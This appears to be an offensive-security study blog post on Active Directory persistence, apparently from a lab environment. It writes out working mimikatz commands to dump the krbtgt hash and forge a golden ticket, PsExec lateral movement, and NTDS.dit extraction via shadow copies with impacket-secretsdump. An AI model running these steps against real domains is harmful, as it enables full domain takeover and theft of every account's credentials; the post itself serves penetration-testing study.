---
layout: post
title: Active Directory Persistence
titledate: 10/01/23
tags: ["infosec", "offsec", "ad", "powershell", "persistence"]
---

#### golden ticket

Silver Tickets create a TGS ticket to access a specific service but Golden Tickets give us access to the entire domain's resources

first let's try to laterally move from a windows client to the DC as the current user

    PS> PsExec64.exe \\DC1 cmd.exe

- Access Denied

without proper privs we are unable to do so

we will need Domain Admin Group account access or access to the DC

we can simulate this by use rdping to the DC with an admin account and using mimikatz to dump the krbtgt account

    mimikatz# privilege::debug

    mimikatz# lsadump::lsa /patch

### now that we have the NTLM hash of the krbtgt account and the domain SID we forge and inject our golden ticket

creating and injecting a golden ticket does not require any admin privs and can be done from a computer not conneted to the domain

    mimikatz# kerberos::purge

first we need to delete any existing kerberos tickets

now we'll supply our obtained domain SID and the /krbtgt options in mimikatz

    mimikatz# kerberos::golden /user:jim /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

now with our golden ticket we can try our lateral movement again in a new comman prompt INSIDE mimikatz to leverage our ticket in memory

    mimikatz# misc::cmd

    C:> PsExec.exe \\dc1 cmd.exe

check our groups

    C:> whoami /groups

if we uses PSExec with the ip we would still get Access Denied

    C:> psexec.exe \\192.168.50.70 cmd.exe

#### shadow copies

vshadow is a utility that lets us create a Shadow Copy so we can extract the Active Directory Database NTDS.dit file

we begin by logging into the DC as an admin user 

then start elevated prompt the vshadow utility

    C:> vshadow.exe -nw -p  C:

now copy the AD database from the shadow copy to the C: root 

    C:> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

now we sav the SYSTEM hive from the registry

    C:> reg.exe save hklm\system c:\system.bak

now we copy these 2 files to our kali system and use impacket

    $ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

now we can use these NTLM hashes and Kerberos keys in either pth techniques or crack them

